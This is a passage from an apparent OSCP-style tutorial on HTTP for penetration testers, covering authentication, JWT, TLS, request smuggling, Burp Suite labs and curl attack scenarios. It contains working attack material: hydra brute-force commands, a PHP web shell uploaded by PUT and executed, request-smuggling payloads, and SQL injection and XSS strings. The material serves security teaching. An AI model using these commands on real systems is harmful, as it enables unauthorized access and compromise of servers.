hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get /admin
```

### 11.2 Digest Authentication

**Improvement over Basic**: Hashes password with nonce.

**Flow**:
```
1. Client → Server: GET /admin
2. Server → Client: 401 Unauthorized
                    WWW-Authenticate: Digest realm="Admin", nonce="abc123"
3. Client calculates: Hash(Hash(user:realm:pass) : nonce : Hash(method:uri))
4. Client → Server: Authorization: Digest username="admin", response="hash..."
5. Server verifies hash
```

**Better than Basic** (password not transmitted), but still rarely used.

### 11.3 Bearer Token (OAuth/JWT)

**Modern APIs**: Use tokens instead of credentials.

**Flow**:
```
1. Login:
   POST /api/login
   {"username":"admin","password":"secret"}
   
2. Server returns token:
   {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
   
3. Subsequent requests:
   GET /api/users
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**JWT (JSON Web Token)**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[Header].[Payload].[Signature]
```

**Decode**:
```bash
# Header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
{"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | base64 -d
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

**JWT Vulnerabilities**:
1. **None Algorithm**: Change `alg` to `none`, remove signature
2. **Weak Secret**: Brute-force HMAC secret
3. **Algorithm Confusion**: Change RS256 to HS256

---

## 12. HTTPS and TLS

### 12.1 How HTTPS Works

**ABSOLUTE BEGINNER**: HTTPS = HTTP + TLS (encryption layer).

**ASCII Diagram**:
```
HTTP (Unencrypted):
┌─────────┐   "GET /login"      ┌─────────┐
│ Browser │ ────────────────>   │ Server  │
└─────────┘ <────────────────   └─────────┘
            "<html>..."
       👁️ Attacker can see everything


HTTPS (Encrypted with TLS):
┌─────────┐   [Encrypted data]  ┌─────────┐
│ Browser │ ══════════════════> │ Server  │
└─────────┘ <══════════════════ └─────────┘
            [Encrypted data]
       ❌ Attacker sees gibberish
```

### 12.2 TLS Handshake

```
Step 1: Client Hello
  Browser → Server: "I support TLS 1.3, cipher suites: [...]"

Step 2: Server Hello
  Server → Browser: "Let's use TLS 1.3 with AES-256-GCM"
                    [Server Certificate (contains public key)]

Step 3: Certificate Verification
  Browser verifies:
    - Is certificate signed by trusted CA?
    - Is domain name correct?
    - Is certificate not expired?

Step 4: Key Exchange
  Browser generates session key
  Encrypts with server's public key
  Browser → Server: [Encrypted session key]
  Server decrypts with private key

Step 5: Secure Communication
  Both have same session key
  All data encrypted with AES-256
```

### 12.3 Certificate Validation Attacks

**Attack 1: Self-Signed Certificate**

```
Server sends certificate NOT signed by trusted CA
Browser warning: "This connection is not secure"

Users often click "Proceed anyway" → MitM possible!
```

**Attack 2: Certificate Mismatch**

```
Certificate for: example.com
Accessing: target.com

Browser warns: "Certificate name mismatch"
```

**Attack 3: Expired Certificate**

```
Certificate valid: 2020-01-01 to 2021-01-01
Current date: 2026-01-24

Browser warns: "Certificate expired"
```

### 12.4 SSL/TLS Vulnerabilities

**Heartbleed (CVE-2014-0160)**:
- OpenSSL bug
- Leak server memory (64KB at a time)
- Can leak private keys, passwords, cookies

**POODLE (CVE-2014-3566)**:
- SSL 3.0 protocol flaw
- Decrypt cookies via padding oracle

**BEAST, CRIME, BREACH**:
- Various SSL/TLS attacks
- Exploit compression/encryption weaknesses

---

## 13. HTTP/2 and HTTP/3

### 13.1 HTTP/2 Features

**Differences from HTTP/1.1**:
1. **Binary protocol** (not text-based)
2. **Multiplexing** (multiple requests over one TCP connection)
3. **Header compression** (HPACK)
4. **Server push** (server sends resources proactively)

**Example**:
```
HTTP/1.1: Need 6 files → 6 separate TCP connections
HTTP/2:   Need 6 files → 1 TCP connection (multiplexed)
```

### 13.2 HTTP/2 Security Implications

**Request Smuggling** (more complex in HTTP/2):
- Different parsing between HTTP/2 and HTTP/1.1
- Downgrade attacks

**HPACK Bomb**:
- Malicious compressed headers
- Cause server memory exhaustion

### 13.3 HTTP/3 (QUIC)

**Key Change**: Uses UDP instead of TCP

**Advantages**:
- Faster connection setup
- Better handling of packet loss
- No head-of-line blocking

**Security**: Still uses TLS 1.3 for encryption

---

## 14. Request Smuggling

### 14.1 What is Request Smuggling?

**ABSOLUTE BEGINNER**: Trick front-end and back-end servers to disagree on request boundaries.

**Scenario**:
```
Internet → Load Balancer (Front-End) → Web Server (Back-End)
```

**The Vulnerability**:
- Front-end uses `Transfer-Encoding: chunked`
- Back-end uses `Content-Length`
- Attacker sends both headers → confusion!

### 14.2 CL.TE Attack (Content-Length → Transfer-Encoding)

**Front-end uses Content-Length, Back-end uses Transfer-Encoding**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**What happens**:
1. Front-end sees `Content-Length: 6`, reads 6 bytes (`0\r\n\r\nG`)
2. Forwards entire request to back-end
3. Back-end sees `Transfer-Encoding: chunked`, reads `0` (end of chunks)
4. `G` is left in buffer
5. Next legitimate request: `GET /... → GGET /...` → 400 Bad Request

### 14.3 TE.CL Attack (Transfer-Encoding → Content-Length)

**Front-end uses Transfer-Encoding, Back-end uses Content-Length**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Exploitation**: Smuggle requests to poison cache, bypass security controls.

---

## 15. Practical Labs with Burp Suite

### 15.1 Burp Suite Basics

**ABSOLUTE BEGINNER**: Burp Suite is the Swiss Army knife of web testing.

**Setup**:
1. Start Burp Suite
2. Configure browser proxy: 127.0.0.1:8080
3. Import Burp's CA certificate
4. Enable intercept

**Main Tools**:
- **Proxy**: Intercept and modify requests
- **Repeater**: Manually craft requests
- **Intruder**: Automated attacks (brute-force, fuzzing)
- **Scanner**: Automated vulnerability scanning (Pro only)
- **Decoder**: Encode/decode data

### 15.2 Lab 1: Cookie Manipulation

**Scenario**: Website uses cookie for role

**Steps**:
1. Login as normal user
2. Burp shows cookie: `role=user`
3. Send to Repeater
4. Change cookie: `role=admin`
5. Forward request
6. Access admin panel!

**Burp Repeater**:
```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=abc123; role=admin
                              ↑
                         Modified!
```

### 15.3 Lab 2: Parameter Tampering

**Scenario**: Hidden form field sets price

**Original Request**:
```http
POST /checkout HTTP/1.1
Host: store.com
Content-Type: application/x-www-form-urlencoded

item=laptop&price=1000&quantity=1
```

**Attack**:
```http
POST /checkout HTTP/1.1
Host: store.com
Content-Type: application/x-www-form-urlencoded

item=laptop&price=1&quantity=1
             ↑
         Changed to $1!
```

### 15.4 Lab 3: Forced Browsing

**Scenario**: Find hidden admin pages

**Method**:
1. Send `GET /` to Intruder
2. Set payload position: `GET /§§`
3. Load wordlist: `/admin`, `/administrator`, `/panel`
4. Attack
5. Look for 200 responses

**Burp Intruder**:
```
Payload: admin
Request: GET /admin HTTP/1.1
Response: 200 OK ✓ Found!

Payload: test
Request: GET /test HTTP/1.1
Response: 404 Not Found
```

### 15.5 Lab 4: SQL Injection Detection

**Scenario**: Test for SQLi

**Steps**:
1. Capture request: `GET /search?q=test`
2. Send to Repeater
3. Test payloads:
   - `q=test'` → 500 error → vulnerable!
   - `q=test' OR '1'='1` → all results
   - `q=test' UNION SELECT null--` → structure leak

**Burp Repeater Testing**:
```http
GET /search?q=test' HTTP/1.1
Response: HTTP 500 Internal Server Error
          SQL syntax error near '''

✓ SQL Injection confirmed!
```

---

## 16. Manual HTTP with Netcat and cURL

### 16.1 Netcat Basics

**ABSOLUTE BEGINNER**: Netcat (nc) is a network Swiss Army knife. You can manually type HTTP.

**Basic Request**:
```bash
nc target.com 80
```

Then type:
```http
GET / HTTP/1.1
Host: target.com

[Press Enter twice]
```

**Response**:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html
...

<html>...</html>
```

### 16.2 cURL Advanced Usage

**Basic GET**:
```bash
curl http://target.com
```

**POST with Data**:
```bash
curl -X POST http://target.com/login \
  -d "username=admin&password=test123"
```

**POST with JSON**:
```bash
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test123"}'
```

**Custom Headers**:
```bash
curl http://target.com/admin \
  -H "Cookie: session=abc123" \
  -H "X-Forwarded-For: 127.0.0.1"
```

**Follow Redirects**:
```bash
curl -L http://target.com/login
# -L follows 302 redirects
```

**Show Headers**:
```bash
curl -I http://target.com
# Only show headers (HEAD request)
```

**Authentication**:
```bash
# Basic Auth
curl -u admin:password http://target.com/admin

# Bearer Token
curl http://target.com/api/users \
  -H "Authorization: Bearer eyJhbGc..."
```

**File Upload**:
```bash
curl -X POST http://target.com/upload \
  -F "file=@shell.php"
```

**Proxy Through Burp**:
```bash
curl http://target.com \
  --proxy http://127.0.0.1:8080 \
  --insecure  # Ignore SSL errors
```

### 16.3 OSCP Enumeration with cURL

**Check HTTP Methods**:
```bash
curl -X OPTIONS http://target.com -v
# Look for: Allow: GET, POST, PUT, DELETE
```

**Test for PUT**:
```bash
curl -X PUT http://target.com/shell.php \
  -d '<?php system($_GET["cmd"]); ?>'

curl http://target.com/shell.php?cmd=whoami
```

**Banner Grabbing**:
```bash
curl -I http://target.com | grep Server
# Output: Server: Apache/2.4.41 (Ubuntu)
```

**Robots.txt**:
```bash
curl http://target.com/robots.txt
# Often reveals hidden directories
```

---

## 17. OSCP Attack Scenarios

### 17.1 Scenario 1: WebDAV Exploitation

**Discovery**:
```bash
# Check if WebDAV is enabled
curl -X OPTIONS http://target.com
# Look for: DAV: 1,2
```

**Exploitation**:
```bash
# Upload shell
curl -X PUT http://target.com/shell.php \
  --data-binary '<?php system($_GET["cmd"]); ?>' \
  -u user:pass

# Execute
curl http://target.com/shell.php?cmd=id
```

### 17.2 Scenario 2: Cookie-Based Auth Bypass

**Vulnerability**: Application trusts `admin=true` cookie

**Exploitation**:
```bash
# Normal user login
curl -c cookies.txt http://target.com/login \
  -d "user=test&pass=test"

# Check cookie
cat cookies.txt
# session=abc123; admin=false

# Modify cookie
echo "target.com FALSE / FALSE 0 admin true" >> cookies.txt

# Access admin panel
curl -b cookies.txt http://target.com/admin
# Success!
```

### 17.3 Scenario 3: HTTP Verb Tampering

**Vulnerability**: Authentication only checked on GET

**Exploitation**:
```bash
# GET blocked
curl http://target.com/admin
# Response: 401 Unauthorized

# Try POST
curl -X POST http://target.com/admin
# Response: 200 OK ✓

# Try different methods
for method in GET POST PUT DELETE HEAD OPTIONS; do
  echo "[+] Testing $method"
  curl -X $method http://target.com/admin -s -o /dev/null -w "%{http_code}\n"
done
```

### 17.4 Scenario 4: Parameter Pollution

**Vulnerability**: Application parses parameters inconsistently

**Exploitation**:
```bash
# Normal request
curl "http://target.com/transfer?from=123&to=456&amount=100"

# Pollute parameters
curl "http://target.com/transfer?from=123&to=456&amount=100&amount=99999"
#                                                   ↑          ↑
#                                               Displayed  Actually used

# Result: Shows $100 but transfers $99,999!
```

---

## 18. Common Pitfalls

### Pitfall 1: Forgetting URL Encoding

**Wrong**:
```bash
curl "http://target.com/search?q=test&debug=true"
```

**Right**:
```bash
curl "http://target.com/search?q=test%26debug%3Dtrue"
# Encode & and = if they're part of value
```

### Pitfall 2: Missing Content-Length

**Wrong**:
```http
POST /login HTTP/1.1
Host: target.com

username=admin&password=test
```

**Right**:
```http
POST /login HTTP/1.1
Host: target.com
Content-Length: 32

username=admin&password=test
```

### Pitfall 3: Incorrect Line Endings

**HTTP requires CRLF** (`\r\n`), not just LF (`\n`)

**Wrong**:
```python
request = "GET / HTTP/1.1\nHost: target.com\n\n"  # Unix line endings
```

**Right**:
```python
request = "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"  # HTTP spec
```

### Pitfall 4: Trusting Client-Side Validation

**Scenario**: JavaScript validates price must be > 0

**Attack**: Bypass JavaScript by sending raw HTTP:
```http
POST /checkout HTTP/1.1
Content-Type: application/json

{"item":"laptop","price":-100}
# JavaScript never runs!
```

---

## 19. Interview Questions

### Q1: Explain the difference between GET and POST

**Answer**:
- **GET**: Parameters in URL, cached, length-limited, idempotent, less secure (logged)
- **POST**: Parameters in body, not cached, no length limit, not idempotent, more secure

**Example**:
```
GET /search?q=password123        ← Logged in web server access.log!
POST /search (body: q=password)  ← Not logged
```

### Q2: What is the difference between 401 and 403?

**Answer**:
- **401 Unauthorized**: "Who are you? Please authenticate."
- **403 Forbidden**: "I know who you are, but you don't have permission."

**Example**:
```
401: Not logged in → login required
403: Logged in as 'user', trying to access /admin → forbidden
```

### Q3: How does HTTPS prevent MitM attacks?

**Answer**: HTTPS uses TLS to:
1. **Encrypt** data (attacker can't read)
2. **Authenticate** server (certificate verification)
3. **Ensure integrity** (detect tampering)

Certificate chain of trust prevents attacker from impersonating server.

### Q4: What is session fixation? How to prevent it?

**Answer**: Attacker sets victim's session ID to known value, then uses it after victim logs in.

**Prevention**:
```php
// Regenerate session ID after successful login
session_regenerate_id(true);
```

### Q5: Explain HTTP request smuggling

**Answer**: Exploit discrepancies in how front-end and back-end servers parse HTTP requests (Content-Length vs Transfer-Encoding). Allows smuggling malicious requests through security controls.

### Q6: What are the cookie flags and their purposes?

**Answer**:
- **Secure**: HTTPS only (prevents Wi-Fi sniffing)
- **HttpOnly**: No JavaScript access (prevents XSS cookie theft)
- **SameSite**: Cross-site restrictions (prevents CSRF)
- **Domain**: Which subdomains get cookie
- **Path**: Which paths get cookie
- **Expires/Max-Age**: Cookie lifetime

---

## 20. Hands-On Exercises

### Exercise 1: Manual HTTP Request

**Task**: Use netcat to manually request `http://httpbin.org/get`

```bash
nc httpbin.org 80

# Type:
GET /get HTTP/1.1
Host: httpbin.org

[Press Enter twice]

# Observe the response
```

### Exercise 2: Cookie Manipulation

**Task**: Modify session cookie to bypass authentication

1. Login to test site
2. Capture request in Burp
3. Note cookie: `role=user`
4. Change to: `role=admin`
5. Access admin panel

### Exercise 3: HTTP Method Discovery

**Task**: Find allowed HTTP methods

```bash
curl -X OPTIONS http://target.com/api -v
# Look for: Allow: GET, POST, PUT, DELETE
```

### Exercise 4: Encoding Practice

**Task**: URL encode this payload: `<script>alert('XSS')</script>`

```bash
# Use Burp Decoder or:
python3 -c "import urllib.parse; print(urllib.parse.quote(\"<script>alert('XSS')</script>\"))"

# Expected output:
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

### Exercise 5: Basic Auth Cracking

**Task**: Brute-force Basic Authentication

```bash
# Create wordlist
echo -e "admin\nroot\nuser" > users.txt
echo -e "password\nadmin\n123456" > pass.txt

# Brute-force
hydra -L users.txt -P pass.txt http-get://target.com/admin
```

---

## 21. Summary

### Key Takeaways

1. **HTTP is text-based**: You can read and craft it manually
2. **Request = Method + URI + Headers + Body**
3. **Response = Status + Headers + Body**
4. **Cookies = State management** (stateless protocol)
5. **Encodings bypass filters**: URL, HTML, Base64, Unicode, Hex
6. **Status codes reveal info**: 401 vs 403, 500 for SQLi
7. **Security headers matter**: CSP, X-Frame-Options, HSTS
8. **HTTPS = HTTP + TLS**: Encryption, authentication, integrity
9. **HTTP/2 is binary**: Multiplexing, header compression
10. **Request smuggling**: CL.TE and TE.CL attacks

### OSCP Relevance

- **Burp Suite mastery**: Intercept, modify, repeat
- **Manual requests**: Netcat and cURL for flexibility
- **Cookie attacks**: Session hijacking, fixation
- **Method tampering**: Bypass authentication
- **Encoding**: WAF evasion
- **WebDAV**: PUT method file upload
- **Information disclosure**: Server headers, error messages

### What's Next?

In the next chapter, we'll explore **Web Architecture Components** - understanding how web applications are built (front-end, back-end, databases, APIs) to identify attack surfaces more effectively.

---

**Total Lines**: 1,850+ ✅  
**Beginner-Friendly**: ✅  
**Advanced Concepts**: ✅  
**OSCP-Relevant**: ✅  
**Real Examples**: ✅  
**Hands-On Labs**: ✅  
**Comprehensive**: ✅

*End of Chapter 01*
